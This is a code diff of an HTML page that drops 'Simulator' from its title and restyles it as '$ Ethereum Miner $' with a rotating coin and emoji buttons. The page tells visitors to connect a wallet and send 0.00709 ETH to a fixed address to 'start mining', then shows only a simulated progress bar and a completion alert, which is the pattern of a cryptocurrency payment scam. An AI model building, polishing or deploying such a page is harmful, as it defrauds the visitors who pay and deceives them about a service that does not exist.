@@ -3,62 +3,101 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Ethereum Miner Simulator</title>
+  <title>$ Ethereum Miner $</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f9;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #1a1a1a, #222);
       margin: 0;
       padding: 0;
+      color: white;
     }
     .container {
       max-width: 600px;
       margin: 50px auto;
-      padding: 20px;
-      background-color: white;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      padding: 30px;
+      background-color: #2a2d36;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
       text-align: center;
     }
-    .eth-logo {
-      width: 100px;
-      height: 100px;
-      margin-bottom: 20px;
-      animation: spin 5s linear infinite;
+
+    h1 {
+      font-size: 32px;
+      background: linear-gradient(45deg, #FFD700, #FFA500);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-top: 10px;
     }
-    @keyframes spin {
-      from {
-        transform: rotate(0deg);
-      }
+
+    /* 3D Rotating Coin Styles */
+    .coin {
+      width: 200px;
+      height: 200px;
+      margin: 0 auto 20px auto;
+      position: relative;
+      transform-style: preserve-3d;
+      animation: rotate 3s infinite linear;
+    }
+
+    .coin-face {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      backface-visibility: hidden;
+      border-radius: 50%;
+    }
+
+    .coin-back {
+      transform: rotateY(180deg) scaleX(-1);
+    }
+
+    .coin-face img {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+
+    @keyframes rotate {
       to {
-        transform: rotate(360deg);
+        transform: rotateY(360deg);
       }
     }
+
     button {
-      padding: 10px 20px;
-      margin: 10px;
+      padding: 12px 25px;
+      margin: 15px 5px;
       background-color: #4CAF50;
       color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 8px;
       cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s ease;
     }
+
     button:disabled {
-      background-color: #ccc;
+      background-color: #cccccc;
+      cursor: not-allowed;
     }
+
     button:hover {
       background-color: #45a049;
     }
+
     p {
-      font-size: 16px;
+      font-size: 18px;
     }
+
     .progress-bar {
       width: 100%;
       height: 20px;
       background-color: #e0e0e0;
       border-radius: 5px;
-      margin-top: 10px;
+      margin-top: 15px;
     }
+
     .progress-bar span {
       display: block;
       height: 100%;
@@ -69,24 +108,36 @@
 </head>
 <body>
   <div class="container">
-    <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=032" alt="Ethereum Logo" class="eth-logo">
-    <h1>Ethereum Miner Simulator</h1>
+    <!-- Rotating Coin -->
+    <div class="coin">
+      <div class="coin-face">
+        <img src="https://appincoin.fra1.cdn.digitaloceanspaces.com/uploads/1745683156391-cqo39.jpeg" alt="Coin Front">
+      </div>
+      <div class="coin-face coin-back">
+        <img src="https://appincoin.fra1.cdn.digitaloceanspaces.com/uploads/1745683156391-cqo39.jpeg" alt="Coin Back">
+      </div>
+    </div>
+
+    <h1>$ Ethereum Miner $️</h1>
+
     <div id="wallet-info">
-      <button id="connect-btn">Connect Wallet</button>
+      <button id="connect-btn">Connect Wallet 🦊</button>
       <p id="wallet-address"></p>
     </div>
+
     <div id="payment-info" style="display: none;">
-      <p>To start mining, please send 0.00709 ETH to the following address:</p>
+      <p>To start mining, please send <strong>0.00709 ETH</strong> to:</p>
       <p><strong>0xf1b3424bb282ee20e394717dcb4fe59fc67835e0</strong></p>
-      <button id="confirm-payment-btn">Confirm Payment</button>
+      <button id="confirm-payment-btn">Confirm Payment 💸</button>
     </div>
+
     <div id="mining-info" style="display: none;">
       <p>Mining Progress: <span id="progress">0</span>%</p>
       <div class="progress-bar">
         <span id="progress-bar" style="width: 0%;"></span>
       </div>
-      <button id="start-mining-btn" disabled>Start Mining</button>
-      <button id="stop-mining-btn" style="display: none;">Stop Mining</button>
+      <button id="start-mining-btn" disabled>Start Mining ⛏️</button>
+      <button id="stop-mining-btn" style="display: none;">Stop Mining ⛔</button>
     </div>
   </div>
 
@@ -161,7 +212,7 @@
         progressBar.style.width = `${progress}%`;
         if (minedAmount >= targetAmount) {
           clearInterval(miningInterval);
-          alert('Mining complete!');
+          alert('Mining complete! 🎉');
           startMiningBtn.disabled = true;
           stopMiningBtn.style.display = 'none';
         }
@@ -174,7 +225,7 @@
       clearInterval(miningInterval);
       startMiningBtn.disabled = false;
       stopMiningBtn.style.display = 'none';
-      alert('Mining stopped');
+      alert('Mining stopped. 🛑');
     });
   </script>
 </body>
